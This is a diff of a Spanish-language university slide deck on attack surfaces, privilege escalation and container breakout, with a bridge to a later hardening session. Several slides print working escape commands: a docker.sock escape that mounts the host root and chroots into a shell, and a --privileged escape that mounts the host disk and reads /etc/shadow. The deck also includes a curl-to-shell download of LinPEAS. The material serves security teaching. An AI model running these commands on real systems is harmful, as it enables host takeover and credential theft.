+<div class="crd sq"><h3>Motor de virtualización</h3><p style="margin-top:.4em;">Si <code>dockerd</code> o el kubelet es vulnerable, todos sus contenedores hijos están en riesgo aunque cada uno esté bien configurado.</p></div>
+</div>
+</div>
+<div class="ft"><span class="nt">Superficie de ataque · Sesión 22</span><span class="ctr">11 / 22</span></div>
+</div>
+</section>
+
+<!-- Slide 12 · CVE -->
+<section class="slide cnt">
+<div class="inn">
+<div class="hd">Bloque conceptual D · CVE y vulnerabilidades 0-Day</div>
+<div class="ct tc">
+<div>
+<h2>CVE — Common Vulnerabilities and Exposures</h2>
+<p><strong>CVE</strong> es el diccionario global de vulnerabilidades de software mantenido por MITRE. Cada vulnerabilidad registrada recibe un identificador único como <strong>CVE-2022-0492</strong>.</p>
+<ul style="margin-top:.5em;">
+<li>Los administradores cruzan la lista semanal de CVEs contra los sistemas de su empresa.</li>
+<li><strong>Zero-Day (0-Day):</strong> vulnerabilidad de la que el fabricante aún no tiene conocimiento — no existe parche al momento del ataque.</li>
+<li><strong>Buffer Overflow:</strong> exceder deliberadamente una variable en RAM para reescribir memoria adyacente y forzar ejecución de código arbitrario (shellcode).</li>
+</ul>
+</div>
+<div class="caw sq">
+<h3>CVE-2022-0492</h3>
+<p style="margin-top:.5em;">Vulnerabilidad en la implementación de Cgroups v1 del Kernel Linux. Permitía a un contenedor sin privilegios especiales escapar al sistema host manipulando el subsistema de control de recursos.</p>
+<p style="margin-top:.6em;" class="nt">Publicado en Febrero 2022. Afectó kernels 2.6.24 a 5.16.2.</p>
+</div>
+</div>
+<div class="ft"><span class="nt">CVE · Sesión 22</span><span class="ctr">12 / 22</span></div>
+</div>
+</section>
+
+<!-- Slide 13 · Escalamiento de privilegios -->
+<section class="slide cnt">
+<div class="inn">
+<div class="hd">Bloque conceptual E · Escalamiento de privilegios</div>
+<div class="ct tce">
+<div class="crd sq">
+<h3 style="color:#dc2626;">Remoto — RCE (Remote Code Execution)</h3>
+<p style="margin-top:.5em;">El atacante ejecuta código desde internet sin tener cuenta en la máquina. Ejemplo: inyección en una aplicación PHP que fuerza la ejecución de comandos del servidor web.</p>
+<p style="margin-top:.6em;" class="nt">Punto de entrada: aplicación expuesta a la red.</p>
+</div>
+<div class="crd sq">
+<h3 style="color:#e6a817;">Local — LPE (Local Privilege Escalation)</h3>
+<p style="margin-top:.5em;">El atacante ya está dentro del sistema (como usuario ordinario o dentro de un contenedor). Su objetivo: pasar de <code>uid=1000 (www-data)</code> a <code>uid=0 (root)</code>.</p>
+<p style="margin-top:.6em;" class="nt">Mecanismos: binarios SUID, sudo mal configurado, exploit de kernel.</p>
+</div>
+</div>
+<div class="cal sq">
+<p><strong>Cadena típica:</strong> RCE inicial → shell de usuario bajo privilegio → LPE → root en contenedor → Container Breakout → root en host físico.</p>
+</div>
+<div class="ft"><span class="nt">Escalamiento · Sesión 22</span><span class="ctr">13 / 22</span></div>
+</div>
+</section>
+
+<!-- Slide 14 · SUID -->
+<section class="slide cnt">
+<div class="inn">
+<div class="hd">Bloque conceptual E · Bit SUID</div>
+<div class="ct tc">
+<div>
+<h2>Set User ID (SUID) — poder heredado del dueño</h2>
+<p><strong>SUID</strong> es un bit de permiso en Linux. Cuando está activo en un ejecutable, el programa corre con los permisos del <em>dueño del archivo</em> (normalmente root), no del usuario que lo lanza.</p>
+<p style="margin-top:.5em;">Uso legítimo: <code>passwd</code> necesita escribir en <code>/etc/shadow</code> (solo root), pero cualquier usuario lo ejecuta. El SUID permite esto de forma controlada.</p>
+<p style="margin-top:.5em;"><strong>Uso malicioso:</strong> si un binario con SUID root permite inyectar comandos, el atacante ejecuta código arbitrario como root.</p>
+</div>
+<div class="cod sq">
+<span class="cm"># Buscar binarios SUID en todo el sistema:</span>
 $ find / -perm -u=s -type f 2>/dev/null
-        </div>
-        <ul>
-            <li>Este comando recorre todo el disco duro viendo si el administrador configuró mal algún ejecutable otorgándole privilegios SUID permanentes.</li>
-        </ul>
-    </div>
 
-    <!-- Slide 12 -->
-    <div class="slide">
-        <h1>Escape del Contenedor (Container Breakout)</h1>
-        <p>Imagina que atacas el servidor de la universidad y ganas la shell. Haces un `ls` pero notas que no hay directorios humanos, y el número de procesos es extremadamente bajo.</p>
-        <p>Descubres con horror que no hackeaste el servidor... hackeaste solo un <strong>contenedor Docker de honeypot</strong>.</p>
-        <div class="box pulse-danger">
-            <h3>Breakout</h3>
-            <p>Es la serie de técnicas para fracturar los namespaces (S21), salir del entorno aislado y ganar control total del Servidor (El Anfitrión real).</p>
-        </div>
-    </div>
+<span class="cm"># Salida esperada (legítimos):</span>
+<span class="cs">/usr/bin/passwd</span>
+<span class="cs">/usr/bin/sudo</span>
+<span class="cs">/usr/bin/su</span>
+<span class="cm"># Si aparece /tmp/shell o /usr/local/bin/curl → alerta</span></div>
+</div>
+<div class="ft"><span class="nt">SUID · Sesión 22</span><span class="ctr">14 / 22</span></div>
+</div>
+</section>
 
-    <!-- Slide 13 -->
-    <div class="slide">
-        <h1>Vector Clásico: Docker Socket Montado</h1>
-        <p>Los desarrolladores son vagos. A veces necesitan que un contenedor invoque a otros contenedores dentro de la infraestructura (Ej. Jenkins CI/CD). Para evitar problemas configuran esto al crear el contenedor:</p>
-        <div class="code-block">
-docker run -v /var/run/docker.sock:/var/run/docker.sock jenkins
-        </div>
-        <p><strong>El Error Técnico:</strong> Le están dando al contenedor interno la llave directa del demonio <code>dockerd</code> padre del sistema anfitrión.</p>
-    </div>
+<!-- Slide 15 · Práctica 1 -->
+<section class="slide cnt">
+<div class="inn">
+<div class="hd">Práctica en clase 1 · Reconocimiento de SUID</div>
+<div class="ct">
+<h2>Escenario: auditoría de binarios privilegiados</h2>
+<div class="caw" style="margin-bottom:.6em;">
+<p><strong>Enunciado:</strong> en un sistema Linux (WSL, máquina virtual o contenedor), ejecutar el reconocimiento de binarios SUID y clasificar los resultados.</p>
+</div>
+<ol>
+<li class="sq">Ejecutar el comando de búsqueda: <code>find / -perm -u=s -type f 2&gt;/dev/null</code></li>
+<li class="sq">Listar los binarios encontrados. Para cada uno, responder: ¿para qué sirve este binario? ¿Es razonable que tenga SUID?</li>
+<li class="sq">Identificar si algún binario no esperado aparece (ej: <code>vim</code>, <code>python3</code>, <code>curl</code>). ¿Por qué sería peligroso?</li>
+<li class="sq">Investigar en <a href="https://gtfobins.github.io" target="_blank">GTFOBins</a> cómo se explotaría un binario SUID específico.</li>
+</ol>
+<p class="nt" style="margin-top:.5em;">Actividad de práctica formativa en clase. No evaluativa.</p>
+</div>
+<div class="ft"><span class="nt">Práctica 1 · Sesión 22</span><span class="ctr">15 / 22</span></div>
+</div>
+</section>
 
-    <!-- Slide 14 -->
-    <div class="slide">
-        <h1>Anatomía del Escape Socket (Paso 1)</h1>
-        <p>Si logro comprometer el contenedor "Jenkins" vulnerable por la web externa y detecto montado el <code>docker.sock</code>, puedo usar el socket para dar órdenes directas al servidor host físico que administra mi encierro.</p>
-        <div class="code-block">
-# Desde adentro de la jaula, ordeno al Host (vía socket):
+<!-- Slide 16 · Container Breakout conceptual -->
+<section class="slide cnt">
+<div class="inn">
+<div class="hd">Bloque conceptual F · Container Breakout</div>
+<div class="ct tc">
+<div>
+<h2>Fracturar los namespaces</h2>
+<p><strong>Container Breakout</strong> es el conjunto de técnicas para salir del entorno de aislamiento de un contenedor y obtener control del host real.</p>
+<p style="margin-top:.5em;">Escenario típico: un atacante explota una vulnerabilidad en la aplicación web dentro del contenedor, obtiene una shell, y descubre que está dentro de un contenedor — no del servidor real.</p>
+<ul style="margin-top:.5em;">
+<li>El objetivo pasa de comprometer la app a comprometer el host.</li>
+<li>Señal de que estás en un contenedor: PID máximo bajo (&lt;20), ausencia de usuarios reales, <code>/.dockerenv</code> presente.</li>
+</ul>
+</div>
+<div class="cad sq">
+<h3>¿Qué se gana al escapar?</h3>
+<p style="margin-top:.5em;">Acceso al sistema de archivos real del host, a todos los demás contenedores corriendo, y posiblemente a la red corporativa interna detrás del servidor.</p>
+</div>
+</div>
+<div class="ft"><span class="nt">Container Breakout · Sesión 22</span><span class="ctr">16 / 22</span></div>
+</div>
+</section>
+
+<!-- Slide 17 · Vector Docker Socket -->
+<section class="slide cnt">
+<div class="inn">
+<div class="hd">Bloque conceptual F · Vector 1: Docker socket montado</div>
+<div class="ct tc">
+<div>
+<h2>Montar <code>/var/run/docker.sock</code> en un contenedor</h2>
+<p>Algunos equipos montan el socket Unix del daemon Docker dentro de un contenedor (ej: Jenkins CI/CD) para que pueda lanzar otros contenedores:</p>
+<div class="cod" style="margin-top:.5em;">docker run -v /var/run/docker.sock:/var/run/docker.sock jenkins</div>
+<p style="margin-top:.6em;"><strong>El error:</strong> esto le da al contenedor la llave directa del <code>dockerd</code> padre. Desde adentro, el contenedor puede comandar al daemon que lo enjauló.</p>
+</div>
+<div class="cod sq">
+<span class="cm"># Paso 1: desde el contenedor comprometido,
+# ordenar al daemon host listar contenedores:</span>
 $ docker -H unix:///var/run/docker.sock ps
-        </div>
-        <p>El contenedor ahora está comandando al demonio que lo enjauló. Es como si el preso le dictara órdenes al director de la prisión.</p>
-    </div>
 
-    <!-- Slide 15 -->
-    <div class="slide">
-        <h1>Anatomía del Escape Socket (Paso 2)</h1>
-        <p>Finalmente, para cristalizar la salida al entorno anfitrión y romper el contenedor, emito la orden final:</p>
-        <div class="code-block">
-$ docker -H unix:///var/run/docker.sock run -it \
-    -v /:/host debian chroot /host /bin/bash
-        </div>
-        <ul>
-            <li>Le pedimos al docker raíz crear OTRO contenedor.</li>
-            <li>Le decimos que monte la raíz TOTA <code>/</code> del servidor físico real dentro de una carpeta <code>/host</code>.</li>
-            <li>Hacemos <code>chroot</code> ahí, escapando completamente a Ring 0 anfitrión.</li>
-        </ul>
-    </div>
+<span class="cm"># Paso 2: lanzar nuevo contenedor que monte
+# la raíz completa del host:</span>
+$ docker -H unix:///var/run/docker.sock run \
+  -it -v /:/host debian chroot /host /bin/bash
 
-    <!-- Slide 16 -->
-    <div class="slide">
-        <h1>Práctica 2: El comando prohibido (<code>--privileged</code>)</h1>
-        <p>Hay un flag terrible en docker. A los estudiantes o desarrolladores les da un error de permisos en su contenedor y buscando en internet usan el flag <strong>--privileged</strong>.</p>
-        <p><strong>¿Qué hace esto?</strong> Apaga drásticamente <code>Cgroups</code>, SecComp y los perfiles de seguridad, permitiéndole al contenedor inyectar memoria directamente en el Kernel de Host.</p>
-    </div>
+  <span class="cm"># Resultado: shell con acceso total al host real</span></div>
+</div>
+<div style="display:flex;flex-direction:column;gap:8px;margin-top:12px;">
+<video id="breakout-video"
+  src="../videos/s22_container_breakout/renders/s22_container_breakout_2026-05-07_23-47-48.mp4"
+  controls
+  loop
+  style="width:100%;border-radius:8px;border:2px solid var(--tur);background:#000;display:block;"
+  onloadedmetadata="this.playbackRate=1;"
+></video>
+<p class="nt" style="text-align:center;">▶ Video explicativo · Container Breakout via docker.sock (~32s)</p>
+</div>
+<div class="ft"><span class="nt">Docker socket · Sesión 22</span><span class="ctr">17 / 22</span></div>
+</div>
+</section>
 
-    <!-- Slide 17 -->
-    <div class="slide">
-        <h1>Práctica 2: Ejecutando el contenedor Inseguro</h1>
-        <div class="code-block">
-# Desde tu máquina Host en un ambiente controlado:
-$ docker run -d --name caja_roto --privileged ubuntu sleep 9000
+<!-- Slide 18 · Vector --privileged -->
+<section class="slide cnt">
+<div class="inn">
+<div class="hd">Bloque conceptual F · Vector 2: flag --privileged</div>
+<div class="ct tc">
+<div>
+<h2>El flag que desactiva todos los controles</h2>
+<p><code>--privileged</code> desactiva Cgroups de seguridad, SecComp y los perfiles de AppArmor. Extiende todas las Linux Capabilities al contenedor, incluyendo <code>CAP_SYS_ADMIN</code>.</p>
+<p style="margin-top:.5em;">Un desarrollador lo usa para resolver errores de permisos sin entender las consecuencias. En producción es inadmisible.</p>
+</div>
+<div class="cod sq">
+<span class="cm"># Lanzar contenedor con privilegios totales:</span>
+$ docker run -d --name jaula --privileged ubuntu sleep 9000
+$ docker exec -it jaula bash
 
-# Entramos al contenedor supuestamente aislado como simple root interno:
-$ docker exec -it caja_roto bash
-        </div>
-        <p>Estamos "aislados". Procedamos a quebrar la pared...</p>
-    </div>
-
-    <!-- Slide 18 -->
-    <div class="slide">
-        <h1>Práctica 2: Generando el Escape en Vivo</h1>
-        <p>El objetivo es leer un archivo del administrador real en el servidor base que el contenedor (por S21 Namespaces) NO debería poder ver.</p>
-        <div class="code-block">
-# Aún dentro de "caja_roto":
-# 1. Chequeamos a qué disco base tenemos acceso real usando fdisk
+<span class="cm"># Dentro del contenedor: montar el disco real del host</span>
 $ fdisk -l | grep dev
-
-# 2. Creamos un punto temporal y montamos a la fuerza el disco real (Host)
 $ mkdir /escape
-$ mount /dev/sda1 /escape    <-- Esto ESTÁ prohibido en un contendor normal.
+$ mount /dev/sda1 /escape
 
-# 3. Listamos carpetas reales del host:
+<span class="cm"># Acceder a los archivos reales del servidor:</span>
 $ ls -la /escape/home/
-        </div>
-    </div>
+$ cat /escape/etc/shadow</div>
+</div>
+<div class="ft"><span class="nt">--privileged · Sesión 22</span><span class="ctr">18 / 22</span></div>
+</div>
+</section>
 
-    <!-- Slide 19 -->
-    <div class="slide">
-        <h1>Conclusiones sobre el Privileged Mode</h1>
-        <p>Pudimos montar el disco <code>/dev/sda1</code> porque Docker descartó los perfiles de seguridad base y extendió sus "Linux Capabilities" a <code>cap_sys_admin</code> (Omnipotencia total).</p>
-        <p><strong>REGLA DE INFRAESTRUCTURA:</strong> Si estás administrando servidores, una auditoría seria te despedirá (y con razón) si usas contenedores con flag <code>--privileged</code> para servicios de producción no orquestales.</p>
-    </div>
+<!-- Slide 19 · Práctica 2 -->
+<section class="slide cnt">
+<div class="inn">
+<div class="hd">Práctica en clase 2 · Análisis forense de procesos</div>
+<div class="ct">
+<h2>Detectar señales de actividad maliciosa activa</h2>
+<div class="caw" style="margin-bottom:.6em;">
+<p><strong>Enunciado:</strong> en un sistema Linux, identificar procesos y conexiones de red que presenten señales de alerta características de malware activo.</p>
+</div>
+<div class="tce">
+<div>
+<ol>
+<li class="sq">Ver procesos con CPU alta: <code>ps aux --sort=-%cpu | head -10</code></li>
+<li class="sq">Ver conexiones de red activas: <code>ss -tunap</code></li>
+<li class="sq">Buscar archivos modificados recientemente en <code>/etc/</code>: <code>find /etc -newer /etc/passwd -type f</code></li>
+</ol>
+</div>
+<div class="crd">
+<p><strong>Señales de alerta</strong></p>
+<ul style="margin-top:.4em;">
+<li>Proceso con nombre genérico (<code>kworker</code>) consumiendo CPU sin razón</li>
+<li>Conexiones salientes a IPs desconocidas en puertos inusuales</li>
+<li>Servicios habilitados que el administrador no instaló</li>
+</ul>
+</div>
+</div>
+<p class="nt" style="margin-top:.5em;">Actividad de práctica formativa en clase. No evaluativa.</p>
+</div>
+<div class="ft"><span class="nt">Práctica 2 · Sesión 22</span><span class="ctr">19 / 22</span></div>
+</div>
+</section>
 
-    <!-- Slide 20 -->
-    <div class="slide">
-        <h1>El Kernel Shared (Vulnerabilidades 0-Day)</h1>
-        <p>A pesar de no montar el Docker Socket o usar --privileged, recuerda un riesgo inherente:</p>
-        <p>El contenedor no es otra máquina. Es tu mismo Kernel. Si el Host está usando Linux Kernel 4.15 y ese kernel es vulnerable a un desbordamiento de caché (Ej. Dirty COW), el proceso contenedor puede ejecutar un exploit que desborde el Kernel maestro e instale un Rootkit. El aislamiento queda obsoleto al instante.</p>
-    </div>
+<!-- Slide 20 · Visual C — LinPEAS y herramientas -->
+<section class="slide cnt">
+<div class="inn">
+<div class="hd">Recurso visual C · Herramientas de reconocimiento automatizado</div>
+<div class="ct tc">
+<div>
+<h2>LinPEAS — Linux Privilege Escalation Awesome Script</h2>
+<p>Los analistas de seguridad no ejecutan <code>find SUID</code> manualmente. Usan scripts orquestados que en segundos escanean:</p>
+<ul style="margin-top:.4em;">
+<li>Versión del kernel y CVEs activos</li>
+<li>Binarios SUID/GUID inusuales</li>
+<li>Sockets expuestos (<code>docker.sock</code>, DBs sin auth)</li>
+<li>Configuraciones de <code>sudo</code> que permiten escalamiento</li>
+<li>Credenciales en texto plano en archivos de configuración</li>
+</ul>
+<p style="margin-top:.5em;">LinPEAS colorea en <span style="color:#dc2626;font-weight:bold;">rojo</span> los vectores de alto impacto y en <span style="color:#e6a817;font-weight:bold;">amarillo</span> los de riesgo medio.</p>
+</div>
+<div class="cad sq">
+<h3>Uso en entorno controlado</h3>
+<div class="cod" style="margin-top:.4em;background:#1a0a0a;">
+<span class="cm"># Descargar y ejecutar en contenedor de laboratorio:</span>
+$ curl -L https://github.com/peass-ng/PEASS-ng/\
+releases/latest/download/linpeas.sh | sh</div>
+<p style="margin-top:.5em;" class="nt">Solo en sistemas propios o laboratorios autorizados. Ejecutarlo en sistemas ajenos sin permiso es ilegal.</p>
+</div>
+</div>
+<div class="ft"><span class="nt">LinPEAS · Sesión 22</span><span class="ctr">20 / 22</span></div>
+</div>
+</section>
 
-    <!-- Slide 21 -->
-    <div class="slide">
-        <h1>Automatizando la Auditoría: LinPEAS</h1>
-        <p>Los analistas y hackers éticos no ejecutan `find SUID` manualmente todo el día. Utilizan scripts orquestados de reconocimiento:</p>
-        <ul>
-            <li><strong>LinPEAS</strong> (Linux Privilege Escalation Awesome Script).</li>
-            <li>Se descarga dentro de la máquina/contenedor vulnerado.</li>
-            <li>Escanea versiones de Kernel, llaves expuestas, sockets libres (docker.sock), y configuraciones fatales.</li>
-            <li>Colorea en rojo y amarillo las vías claras de escape y hackeo nivel de administrador.</li>
-        </ul>
-    </div>
+<!-- Slide 21 · Síntesis técnica -->
+<section class="slide cnt">
+<div class="inn">
+<div class="hd">Síntesis técnica</div>
+<div class="ct">
+<h2>Resumen de la sesión</h2>
+<div class="tce" style="margin-top:.3em;">
+<div class="cal sq"><p><strong>Malware:</strong> Virus, gusanos, troyanos y ransomware se propagan de formas distintas. Rootkits operan en Ring 0 y falsifican la realidad del sistema. Spyware exfiltra datos desde Ring 3.</p></div>
+<div class="caw sq"><p><strong>Easter Eggs:</strong> Código no auditado en software legítimo. Violan el principio de código mínimo y representan potencial backdoor.</p></div>
+<div class="cal sq"><p><strong>Criptografía:</strong> Hash (integridad unidireccional), AES-256 (confidencialidad simétrica), Ed25519/RSA (intercambio seguro de claves). SSH usa asimétrico para autenticar sin contraseña.</p></div>
+<div class="cad sq"><p><strong>Container Breakout:</strong> Montar <code>docker.sock</code> o usar <code>--privileged</code> en producción es equivalente a entregar las llaves del servidor físico al primer proceso comprometido.</p></div>
+</div>
+</div>
+<div class="ft"><span class="nt">Síntesis · Sesión 22</span><span class="ctr">21 / 22</span></div>
+</div>
+</section>
 
-    <!-- Slide 22 -->
-    <div class="slide">
-        <h1>Recomendación Curricular y Referencia</h1>
-        <p>Para ver un "Container Breakout" orquestado desde la perspectiva Red Team atacando sistemas Kubernetes:</p>
-        <div class="box-good" style="margin-top: 20px;">
-            <h3>🎥 "Container Breakout: From Pod to Node"</h3>
-            <p>Referencia técnica pública: <i>DEF CON 30 Hacking Conference</i> o material similar divulgado en academia. Expone visualmente cómo saltar de un nodo aislado a poseer el clúster entero de la empresa en 10 minutos basados en misconfigurations.</p>
-        </div>
-    </div>
+<!-- Slide 22 · Puente a S23 -->
+<section class="slide cnt">
+<div class="inn">
+<div class="hd">Puente técnico a la siguiente sesión</div>
+<div class="ct tce">
+<div>
+<h2>Conocemos la enfermedad…</h2>
+<p>Sabemos cómo actúa el malware, qué debilidades explota el atacante, cómo funciona la criptografía y cómo se realiza un Container Breakout completo.</p>
+<p style="margin-top:.6em;">La pregunta natural es: ¿cómo se <strong>cierra</strong> cada uno de estos vectores antes de que sean explotados?</p>
+</div>
+<div class="cal sq">
+<h3>Sesión 23: Hardening</h3>
+<p style="margin-top:.5em;">Gestión de usuarios y grupos, SSH endurecido, Principio de Menor Privilegio (PoLP), perfiles AppArmor y SecComp, contenedores rootless y sistemas de archivos inmutables. El sistema operativo como defensor activo.</p>
+</div>
+</div>
+<div class="ft"><span class="nt">I.U. Pascual Bravo · Ing. de Sistemas</span><span class="ctr">22 / 22</span></div>
+</div>
+</section>
 
-    <!-- Slide 23 -->
-    <div class="slide">
-        <h1>Resumen de la Taxonomía</h1>
-        <ul>
-            <li>El usuario cree estar a salvo (S20/S21), pero la mala configuración quiebra las APIs del Kernel.</li>
-            <li>El escalamiento de privilegios persigue alcanzar <strong>Ring 0</strong>.</li>
-            <li>Montar sockets (docker.sock) en un contenedor expuesto a la red es un pasaje sin retorno a host takeover.</li>
-            <li>La virtualización estricta (Hypervisores Tipo-1) aísla mejor en seguridad absoluta pero frena rendimiento. El Contenedor otorga agilidad masiva, recayendo toda la seguridad lógica en la "Auditoría de Configuración".</li>
-        </ul>
-    </div>
-
-    <!-- Slide 24 -->
-    <div class="slide">
-        <h1>Puente a la Siguiente Sesión</h1>
-        <div class="grid-layout">
-            <div>
-                <h3>¿Si esto es tan frágil, ¿por qué lo usamos?</h3>
-                <p>Porque podemos blindarlo. Ya conocemos el ataque (S22), la enfermedad.</p>
-            </div>
-            <div class="box pulse">
-                <h3 style="color:var(--good)">S23: Hardening (Endurecimiento)</h3>
-                <p>¿Qué parches cerrar? ¿Qué perfiles AppArmor y SecComp integrar? Transformando vulnerabilidades en fortalezas.</p>
-            </div>
-        </div>
-    </div>
-
-    <!-- Slide 25 -->
-    <div class="slide">
-        <h1>Cierre de la Sesión</h1>
-        <p><strong>Deber para casa (No evaluativo):</strong> Inspeccionar su propia terminal local ejecutando <code>find / -perm -u=s -type f 2>/dev/null</code> y analizar si algún binario que no sea <code>sudo</code> o <code>su</code> o <code>passwd</code> se cuela entre la lista en distribuciones WSL o servidores privados.</p>
-        <p style="margin-top: 50px; text-align: center; color: var(--highlight);">Fin de Sesión 22.</p>
-    </div>
-
-    <!-- Controls -->
-    <div class="controls">
-        <button id="prevBtn" onclick="prevSlide()">Anterior</button>
-        <button id="nextBtn" onclick="nextSlide()">Siguiente</button>
-    </div>
-    <div class="progress-bar" id="progressBar"></div>
-
+<div id="tnv" class="tnv">
+<button id="pb">&lt;</button>
+<button id="nb">&gt;</button>
 </div>
 
+</div></div>
 <script>
-    let currentSlide = 0;
-    const slides = document.querySelectorAll('.slide');
-    const progressBar = document.getElementById('progressBar');
-
-    function updatePresentation() {
-        slides.forEach((slide, index) => {
-            if (index === currentSlide) {
-                slide.classList.add('active');
-            } else {
-                slide.classList.remove('active');
-            }
-        });
-        
-        const progress = ((currentSlide + 1) / slides.length) * 100;
-        progressBar.style.width = progress + '%';
-        
-        document.getElementById('prevBtn').style.opacity = currentSlide === 0 ? '0.5' : '1';
-        document.getElementById('nextBtn').style.opacity = currentSlide === slides.length - 1 ? '0.5' : '1';
-    }
-
-    function nextSlide() {
-        if (currentSlide < slides.length - 1) {
-            currentSlide++;
-            updatePresentation();
-        }
-    }
-
-    function prevSlide() {
-        if (currentSlide > 0) {
-            currentSlide--;
-            updatePresentation();
-        }
-    }
-
-    document.addEventListener('keydown', (e) => {
-        if (e.key === 'ArrowRight' || e.key === ' ') nextSlide();
-        if (e.key === 'ArrowLeft') prevSlide();
-    });
-
-    updatePresentation();
+const tg=document.getElementById("stage"),sl=document.querySelectorAll(".slide");
+let ci=0;
+function sw(n){
+sl[ci].classList.remove("active");
+ci=(n+sl.length)%sl.length;
+sl[ci].classList.add("active");
+const s=sl[ci].querySelectorAll(".sq");
+s.forEach(x=>x.classList.remove("vs"));
+let t=0; s.forEach(x=>{setTimeout(()=>x.classList.add("vs"),t); t+=200;});
+}
+document.getElementById("pb").onclick=(e)=>{e.stopPropagation();sw(ci-1);};
+document.getElementById("nb").onclick=(e)=>{e.stopPropagation();sw(ci+1);};
+document.addEventListener("keydown",e=>{
+if(e.key==="ArrowRight"||e.key==="Space"||e.key==="Enter"){e.preventDefault();sw(ci+1);}
+else if(e.key==="ArrowLeft"){e.preventDefault();sw(ci-1);}
+else if(e.key==="f"){
+if(!document.fullscreenElement) tg.requestFullscreen().catch(()=>{});
+else document.exitFullscreen();
+}
+});
+let ts=0;
+document.addEventListener("touchstart",e=>{ts=e.changedTouches[0].screenX;});
+document.addEventListener("touchend",e=>{
+let te=e.changedTouches[0].screenX;
+if(ts-te>40) sw(ci+1); else if(te-ts>40) sw(ci-1);
+});
+sw(0);
 </script>
 </body>
 </html>
